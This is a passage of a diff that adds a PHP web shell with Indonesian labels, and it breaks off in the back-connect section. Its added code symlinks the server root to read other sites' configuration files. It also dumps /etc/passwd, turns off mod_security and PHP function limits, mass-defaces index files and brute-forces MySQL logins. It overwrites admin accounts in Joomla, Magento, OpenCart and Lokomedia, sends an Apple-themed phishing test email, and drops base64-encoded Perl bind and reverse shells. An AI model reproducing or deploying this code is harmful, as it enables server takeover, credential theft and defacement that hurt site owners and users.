+}
+}
+if($_POST['config'] == 'symlink') {
+@symlink($config,"rabbitz_Symconfig/".$user_rabbitz."-".$nama_config.".txt");
+}
+if($_POST['config'] == '404') {
+$sym404=symlink($config,"rabbitz_sym404/".$user_rabbitz."-".$nama_config.".txt");
+if($sym404){
+    @mkdir("rabbitz_sym404/".$user_rabbitz."-".$nama_config.".txt404", 0777);
+    $htaccess="Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+HeaderName rabbitz.txt
+Satisfy Any
+IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
+IndexIgnore *";
+
+@file_put_contents("rabbitz_sym404/".$user_rabbitz."-".$nama_config.".txt404/.htaccess",$htaccess);
+
+@symlink($config,"rabbitz_sym404/".$user_rabbitz."-".$nama_config.".txt
+    /rabbitz.txt");
+
+    }
+
+}
+
+                    }     
+        }  if($_POST['config'] == 'grab') {
+            echo "<center><a href='?path=$path/rabbitz_configgrab'><font color=lime>Done</font></a></center>";
+        }
+    if($_POST['config'] == '404') {
+        echo "<center>
+<a href=\"rabbitz_sym404/root/\">SymlinkNya</a>
+<br><a href=\"rabbitz_sym404/\">Configurations</a></center>";
+    }
+     if($_POST['config'] == 'symlink') {
+echo "<center>
+<a href=\"rabbitz_symconfig/root/\">Symlinknya</a>
+<br><a href=\"rabbitz_symconfig/\">Configurations</a></center>";
+            }if($_POST['config'] == 'symvhost') {
+echo "<center>
+<a href=\"rabbitz_symvhost/root/\">Root Server</a>
+<br><a href=\"rabbitz_symvhost/\">Configurations</a></center>";
+            }
+        
+        
+        }else{
+        echo "<form method=\"post\" action=\"\"><center>
+        </center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
+        echo include("/etc/passwd"); 
+        echo "</textarea><br><br>
+        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
+        <option value=\"grab\">Config Grab</option>
+        <option value=\"symlink\">Symlink Config</option>
+        <option value=\"404\">Config 404</option>
+        <option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
+}
+}
+
+elseif($_GET['symlink'] == 'server') {
+$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
+$d0mains = @file("/etc/named.conf");
+##httaces
+if($d0mains){
+@mkdir("rabbitz_sym",0777);
+@chdir("rabbitz_sym");
+@exe("ln -s / root");
+$file3 = 'Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+AddType text/plain .php
+AddHandler text/plain .php
+Satisfy Any';
+$fp3 = fopen('.htaccess','w');
+$fw3 = fwrite($fp3,$file3);@fclose($fp3);
+echo "<br>
+<table align=center border=1 style='width:60%;border-color:#333333;'>
+<tr>
+<td align=center><font size=2>S. No.</font></td>
+<td align=center><font size=2>Domains</font></td>
+<td align=center><font size=2>Users</font></td>
+<td align=center><font size=2>Symlink</font></td>
+</tr>";
+$dcount = 1;
+foreach($d0mains as $d0main){
+if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
+flush();
+if(strlen(trim($domains[1][0])) > 2){
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
+echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
+<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
+<td>".$user['name']."</td>
+<td><a href='$full/rabbitz_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
+flush();
+$dcount++;}}}
+echo "</table>";
+}else{
+$TEST=@file('/etc/passwd');
+if ($TEST){
+@mkdir("rabbitz_sym",0777);
+@chdir("rabbitz_sym");
+exe("ln -s / root");
+$file3 = 'Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+AddType text/plain .php
+AddHandler text/plain .php
+Satisfy Any';
+ $fp3 = fopen('.htaccess','w');
+ $fw3 = fwrite($fp3,$file3);
+ @fclose($fp3);
+ echo "
+ <table align=center border=1><tr>
+ <td align=center><font size=3>S. No.</font></td>
+ <td align=center><font size=3>Users</font></td>
+ <td align=center><font size=3>Symlink</font></td></tr>";
+ $dcount = 1;
+ $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
+ while(!feof($file)){
+ $s = fgets($file);
+ $matches = array();
+ $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
+ $matches = str_replace("home/","",$matches[1]);
+ if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
+ continue;
+ echo "<tr><td align=center><font size=2>" . $dcount . "</td>
+ <td align=center><font class=txt>" . $matches . "</td>";
+ echo "<td align=center><font class=txt><a href=$full/rabbitz_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
+ $dcount++;}fclose($file);
+ echo "</table>";}else{if($os != "Windows"){@mkdir("rabbitz_sym",0777);@chdir("rabbitz_sym");@exe("ln -s / root");$file3 = '
+ Options Indexes FollowSymLinks
+DirectoryIndex rabbitz.htm
+AddType text/plain .php
+AddHandler text/plain .php
+Satisfy Any
+';
+ $fp3 = fopen('.htaccess','w');
+ $fw3 = fwrite($fp3,$file3);@fclose($fp3);
+ echo "<center><br><br>
+ <div class='mybox'>
+ <table align=center border=1><tr>
+ <td align=center><font size=3>ID</font></td>
+ <td align=center><font size=3>Users</font></td>
+ <td align=center><font size=3>Symlink</font></td></tr>";
+ $temp = "";$val1 = 0;$val2 = 1000;
+ for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
+ if ($uid)$temp .= join(':',$uid)."\n";}
+ echo '<br/>';$temp = trim($temp);$file5 =
+ fopen("test.txt","w");
+ fputs($file5,$temp);
+ fclose($file5);$dcount = 1;$file =
+ fopen("test.txt", "r") or exit("Unable to open file!");
+ while(!feof($file)){$s = fgets($file);$matches = array();
+ $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
+ if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
+ continue;
+ echo "<tr><td align=center><font size=2>" . $dcount . "</td>
+ <td align=center><font class=txt>" . $matches . "</td>";
+ echo "<td align=center><font class=txt><a href=$full/rabbitz_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
+ $dcount++;}
+ fclose($file);
+ echo "</table></div></center>";unlink("test.txt");
+ } else
+ echo "<center><font size=3>Cannot create Symlink</font></center>";
+ }
+ }
+}
+elseif($_GET['jancok'] == 'adminer') {
+  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+	function adminer($url, $isi) {
+		$fp = fopen($isi, "w");
+		$ch = curl_init();
+		 	  curl_setopt($ch, CURLOPT_URL, $url);
+		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
+		return curl_exec($ch);
+		   	  curl_close($ch);
+		fclose($fp);
+		ob_flush();
+		flush();
+	}
+	if(file_exists('adminer.php')) {
+		echo "<center><font color=#02BC8C><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+	} else {
+		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
+			echo "<center><font color=#02BC8C><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+		} else {
+			echo "<center><font color=red>gagal buat file adminer</font></center>";
+		}
+	}
+}
+elseif($_GET['bypass'] == 'disablefunc'){
+        echo "<br><br><center>";
+        echo "<form method=post><input class='sinput' type=submit name=ini value='php.ini' />&nbsp;<input class='sinput' type=submit name=htce value='.htaccess' />&nbsp;<input class='sinput' type=submit name=litini value='Litespeed' /></form>";
+        if(isset($_POST['ini']))
+{
+        $file = fopen("php.ini","w");
+        echo fwrite($file,"disable_functions=none
+safe_mode = Off
+    ");
+        fclose($file);
+        echo "<a href='php.ini'>click here!</a>";
+}        if(isset($_POST['htce']))
+{
+        $file = fopen(".htaccess","w");
+        echo fwrite($file,"<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+    ");
+        fclose($file);
+        echo "htaccess successfully created!";
+}               if(isset($_POST['litini'])){
+        $iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
+             $byph = "safe_mode = Off n disable_functions= ";
+        $comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
+        file_put_contents("php.ini",base64_decode($byph));
+        file_put_contents("ini.php",base64_decode($iniph));
+        file_put_contents(".htaccess",base64_decode($comp));
+        echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
+        echo"</center>";
+}
+}
+elseif($_GET['do'] == 'mass_deface') {
+ echo "<center><form method='POST'>";
+echo "Base Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
+echo "File Name : <input type='text' name='file_name' value='index.php'><br><br>";
+echo "Your Index : <br><textarea style='width: 685px; height: 330px;' name='index'>//Put Your Index Here</textarea><br>";
+echo "<input class='sinput' type='submit' value='Start'></form></center>";
+ 
+if (isset ($_POST['base_dir']))
+{
+        if (!file_exists ($_POST['base_dir']))
+                die ($_POST['base_dir']." Not Found !<br>");
+ 
+        if (!is_dir ($_POST['base_dir']))
+                die ($_POST['base_dir']." Is Not A Directory !<br>");
+ 
+        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
+ 
+        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
+ 
+        foreach ($files as $file):
+                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
+                {
+                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
+                        if (file_put_contents ($index, $_POST['index']))
+                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
+                }
+        endforeach;
+}
+}
+elseif($_GET['do'] == 'mailtest'){
+?>
+<br><center>
+<form method="POST"><span>Send to : </span><input type=text name=mailto> <input class='sinput' name=meki type=submit value=">>"></form>
+<?php
+if(isset($_POST['meki'])){
+$xc = array("Windows","bluehost","gator","siteground","gra.hosting.ovh","extendcp","contabor","hosting.reg.ru","secureserver");
+$nyata = php_uname();
+foreach ($xc as $xv) {
+
+if(preg_match('/'.$xv.'/', $nyata)){
+
+echo '<font color=red>Server Bad</font><br>';
+}
+
+else{
+
+}
+}
+
+ $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+
+
+$name = "Apple"; $to = "bu9p3t@gmail.com"; $web="$_SERVER[HTTP_HOST]"; 
+$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
+$body = ' 
+<a href="https://wikipedia.org/">Tested Mail 1</a> 
+<br> 
+<a href="https://wikipedia.org/">Tested Mail 2</a> Kids Was Here '; 
+$email = "Apple@$web"; 
+$headers = 'From: ' .
+$email . "\r\n". 
+$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
+$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
+if (mail($to,
+$subject,
+$body,
+$headers,$name)) 
+{ echo(php_uname()."<br><font color=lime>Email Sended To => $to </font>"); 
+} else 
+{ 
+echo(php_uname()."<br><font color=red>Not Support For Mailer</font>"); }
+
+
+
+	    }
+
+}
+elseif($_GET['do'] == 'tolls') {
+?>
+<center><br><br><form method="post">
+<input type="text" name="confleg" placeholder="Config URL Here">
+<br><br>
+<input class="sinput" type="submit" name="chxe" value="Change Admin">
+</form> <form method="POST" target="_blank">
+  <strong>
+   <input name="page" type="hidden" value="find"><br>User:<br><br>
+<textarea cols="80" rows="10" name="usernames"><?php $uSr=file("/etc/passwd"); 
+                             foreach($uSr as $usrr) { $str=explode(":",$usrr);
+                             echo $str[0]."\n";
+                             } echo system('ls /var/mail');
+                             echo system('ls /home'); ?></textarea>
+                             <br><br>Password:<br><br>
+                             <textarea cols="80" rows="10" name="passwords"></textarea><center>
+                               <br><strong>Type :</strong>
+
+   <span class="style2"><strong>Simple : </strong> </span>
+  <strong>
+  <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
+   <font class="style2"><strong>/etc/passwd : </strong> </font>
+  <strong>
+  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
+  </span><br><br><input class="sinput" type="submit" value="start"></form><br><br>
+
+<?php
+	if($_POST['page']=='find')
+	{
+if(isset($_POST['usernames']) && isset($_POST['passwords']))
+	{
+			if($_POST['type'] == 'passwd'){
+					$e = explode("\n",$_POST['usernames']);
+					foreach($e as $value){
+					$k = explode(":",$value);
+					$username .= $k['0']." ";
+					}
+			}elseif($_POST['type'] == 'simple'){
+					$username = str_replace("\n",' ',$_POST['usernames']);
+			}
+			$a1 = explode(" ",$username);
+			$a2 = explode("\n",$_POST['passwords']);
+			$id2 = count($a2);
+			$ok = 0;
+			foreach($a1 as $user )
+			{
+					if($user !== '')
+					{
+					$user=trim($user);
+					 for($i=0;$i<=$id2;$i++)
+					 {
+							$pass = trim($a2[$i]);
+														if(@mysqli_connect('localhost',$user,$pass))
+							{
+									echo "1962Cracker~ user is ==> (<b><font color=green>$user</font></b>) Password is ==> (<b><font color=red>$pass</font></b>)<br />";
+									$ok++;
+							}
+					 }
+					}
+			}
+			echo "<hr><b>You Found <font color=green>$ok</font> cPanel (1962Cracker)</b>";
+			echo "<center><b><a href=".$_SERVER['PHP_SELF']."><~ BACK</a>";
+
+			exit;
+	}
+	}
+}
+elseif($_GET['bypass'] == 'passwd') {
+    echo '<br><br><center>Bypass etc/passw With:<br>
+<table style="width:50%">
+  <tr>
+    <td><form method="post"><input class="sinput" type="submit" value="System Function" name="syst"></form></td>
+    <td><form method="post"><input class="sinput" type="submit" value="Passthru Function" name="passth"></form></td>
+    <td><form method="post"><input class="sinput" type="submit" value="Exec Function" name="ex"></form></td>    
+    <td><form method="post"><input class="sinput" type="submit" value="Shell_exec Function" name="shex"></form></td>        
+    <td><form method="post"><input class="sinput" type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
+</tr></table>Bypass User With : <table style="width:50%">
+<tr>
+    <td><form method="post"><input class="sinput" type="submit" value="Awk Program" name="awkuser"></form></td>
+    <td><form method="post"><input class="sinput" type="submit" value="System Function" name="systuser"></form></td>
+    <td><form method="post"><input class="sinput" type="submit" value="Passthru Function" name="passthuser"></form></td>    
+    <td><form method="post"><input class="sinput" type="submit" value="Exec Function" name="exuser"></form></td>        
+    <td><form method="post"><input class="sinput" type="submit" value="Shell_exec Function" name="shexuser"></form></td>
+</tr>
+</table><br>';
+
+
+if ($_POST['awkuser']) {
+echo"<textarea class='inputzbut' cols='65' rows='15'>";
+echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
+echo "</textarea><br>";
+}
+if ($_POST['systuser']) {
+echo"<textarea class='inputzbut' cols='65' rows='15'>";
+echo system("ls /var/mail");
+echo "</textarea><br>";
+}
+if ($_POST['passthuser']) {
+echo"<textarea class='inputzbut' cols='65' rows='15'>";
+echo passthru("ls /var/mail");
+echo "</textarea><br>";
+}
+if ($_POST['exuser']) {
+echo"<textarea class='inputzbut' cols='65' rows='15'>";
+echo exec("ls /var/mail");
+echo "</textarea><br>";
+}
+if ($_POST['shexuser']) {
+echo"<textarea class='inputzbut' cols='65' rows='15'>";
+echo shell_exec("ls /var/mail");
+echo "</textarea><br>";
+}
+if($_POST['syst'])
+{
+echo"<textarea class='inputz' cols='65' rows='15'>";
+echo system("cat /etc/passwd");
+echo"</textarea><br><br><b></b><br>";
+}
+if($_POST['passth'])
+{
+echo"<textarea class='inputz' cols='65' rows='15'>";
+echo passthru("cat /etc/passwd");
+echo"</textarea><br><br><b></b><br>";
+}
+if($_POST['ex'])
+{
+echo"<textarea class='inputz' cols='65' rows='15'>";
+echo exec("cat /etc/passwd");
+echo"</textarea><br><br><b></b><br>";
+}
+if($_POST['shex'])
+{
+echo"<textarea class='inputz' cols='65' rows='15'>";
+echo shell_exec("cat /etc/passwd");
+echo"</textarea><br><br><b></b><br>";
+}
+echo '<center>';
+if($_POST['melex'])
+{
+echo"<textarea class='inputz' cols='65' rows='15'>";
+for($uid=0;$uid<60000;$uid++){ 
+$ara = posix_getpwuid($uid);
+if (!empty($ara)) {
+while (list ($key, $val) = each($ara)){
+print "$val:";
+}
+print "\n";
+}
+}
+echo"</textarea><br><br>";
+}
+}
+elseif($_GET['cok'] == 'nganua') {
+    if($_POST['byarr']) {
+        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
+            echo "username atau password harus lebih dari 6 karakter";
+        } else {
+            $user_baru = $_POST['user_baru'];
+            $pass_baru = md5($_POST['pass_baru']);
+            $conf = $_POST['config_dir'];
+            $scan_conf = scandir($conf);
+            foreach($scan_conf as $file_conf) {
+                if(!is_file("$conf/$file_conf")) continue;
+                $config = file_get_contents("$conf/$file_conf");
+                if(preg_match("/JConfig|joomla/",$config)) {
+                    $dbhost = ambilkata($config,"host = '","'");
+                    $dbuser = ambilkata($config,"user = '","'");
+                    $dbpass = ambilkata($config,"password = '","'");
+                    $dbname = ambilkata($config,"db = '","'");
+                    $dbprefix = ambilkata($config,"dbprefix = '","'");
+                    $prefix = $dbprefix."users";
+                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+                    $db = mysql_select_db($dbname);
+                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+                    $result = mysql_fetch_array($q);
+                    $id = $result['id'];
+                    $site = ambilkata($config,"sitename = '","'");
+                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+                    echo "Config => ".$file_conf."<br>";
+                    echo "CMS => Joomla<br>";
+                    if($site == '') {
+                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
+                    } else {
+                        echo "Sitename => $site<br>";
+                    }
+                    if(!$update OR !$conn OR !$db) {
+                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+                    } else {
+                        echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+                    }
+                    mysql_close($conn);
+                }  elseif(preg_match("/Magento|Mage_Core/",$config)) {
+                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
+                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
+                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
+                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
+                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
+                    $prefix = $dbprefix."admin_user";
+                    $option = $dbprefix."core_config_data";
+                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+                    $db = mysql_select_db($dbname);
+                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+                    $result = mysql_fetch_array($q);
+                    $id = $result[user_id];
+                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
+                    $result2 = mysql_fetch_array($q2);
+                    $target = $result2[value];
+                    if($target == '') {
+                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+                    } else {
+                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
+                    }
+                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+                    echo "Config => ".$file_conf."<br>";
+                    echo "CMS => Magento<br>";
+                    echo $url_target;
+                    if(!$update OR !$conn OR !$db) {
+                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+                    } else {
+                        echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+                    }
+                    mysql_close($conn);
+                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
+                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
+                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
+                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
+                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
+                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
+                    $prefix = $dbprefix."user";
+                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+                    $db = mysql_select_db($dbname);
+                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+                    $result = mysql_fetch_array($q);
+                    $id = $result[user_id];
+                    $target = ambilkata($config,"HTTP_SERVER', '","'");
+                    if($target == '') {
+                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+                    } else {
+                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
+                    }
+                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+                    echo "Config => ".$file_conf."<br>";
+                    echo "CMS => OpenCart<br>";
+                    echo $url_target;
+                    if(!$update OR !$conn OR !$db) {
+                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+                    } else {
+                        echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+                    }
+                    mysql_close($conn);
+                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
+                    $dbhost = ambilkata($config,'server = "','"');
+                    $dbuser = ambilkata($config,'username = "','"');
+                    $dbpass = ambilkata($config,'password = "','"');
+                    $dbname = ambilkata($config,'database = "','"');
+                    $prefix = "users";
+                    $option = "identitas";
+                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+                    $db = mysql_select_db($dbname);
+                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
+                    $result = mysql_fetch_array($q);
+                    $target = $result[alamat_website];
+                    if($target == '') {
+                        $target2 = $result[url];
+                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+                        if($target2 == '') {
+                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+                        } else {
+                            $cek_login3 = file_get_contents("$target2/adminweb/");
+                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
+                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
+                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
+                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
+                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
+                            } else {
+                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+                            }
+                        }
+                    } else {
+                        $cek_login = file_get_contents("$target/adminweb/");
+                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
+                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
+                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
+                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
+                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
+                        } else {
+                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+                        }
+                    }
+                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
+                    echo "Config => ".$file_conf."<br>";
+                    echo "CMS => Lokomedia<br>";
+                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
+                        echo $url_target2;
+                    } else {
+                        echo $url_target;
+                    }
+                    if(!$update OR !$conn OR !$db) {
+                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+                    } else {
+                        echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+                    }
+                    mysql_close($conn);
+                }
+            }
+        }
+    } else {
+        echo "<center>
+       <br><br>
+        <form method='post'>
+        DIR Config: <br>
+        <input type='text' size='50' name='config_dir' value='$path'><br><br>
+        Set User & Pass: <br>
+        <input type='text' name='user_baru' value='iniuser' placeholder='user_baru'><br>
+        <input type='text' name='pass_baru' value='inipassword?' placeholder='pass_baru'><br>
+        <input class='sinput' type='submit' name='byarr' value='Edit' style='width: 215px;'>
+        </form>";
+    }
+}
+elseif($_GET['backconnect'] == 'tool'){
+echo "<br><br><center><form method=post>
+<br>    <span>Bind port to /bin/sh [Perl]</span><br/>
+    Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
+<br><br>
+        <span>Back-connect</span><br/>
+    Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
+   <input class='sinput' type=submit value='>>'>";
+    if($_POST['bpl']) {
+    $bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
+    $brt=@fopen('bp.pl','w');
+fwrite($brt,$bp);
+$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
+sleep(1);
+echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
+unlink("bp.pl");
+        }
+        if($_POST['backconnect'] == 'perl') {
+$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
+$plbc=@fopen('bc.pl','w');
+fwrite($plbc,$bc);
+$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
+sleep(1);
+echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
+unlink("bc.pl");
+}
+if($_POST['backconnect'] == 'python') {
